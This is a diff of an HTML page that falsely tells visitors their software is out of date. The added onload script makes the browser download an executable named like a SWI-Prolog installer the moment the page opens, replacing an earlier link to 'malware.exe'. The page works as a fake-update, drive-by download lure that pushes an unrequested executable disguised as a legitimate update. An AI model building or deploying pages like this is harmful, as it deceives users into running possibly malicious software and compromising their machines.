@@ -1,12 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Update Software Now</title>
+    <script>
+        window.onload = function() {
+            // Trigger download automatically
+            const link = document.createElement('a');
+            link.href = 'swipl-9.2.9-1.x64.exe'; // File name on server
+            link.download = 'swipl-9.2.9-1.x64.exe'; // Name for downloaded file
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
 </head>
 <body>
-    <h1>Update Software Now</h1>
-    <p>Your software is out of date. Click below to update.</p>
-    <a href="malware.exe" download>Download Update</a>
+    <h1>Downloading...</h1>
+    <p>Your software is out of date. Click below to update., <a href="swipl-9.2.9-1.x64.exe">click here</a>.</p>
 </body>
 </html>
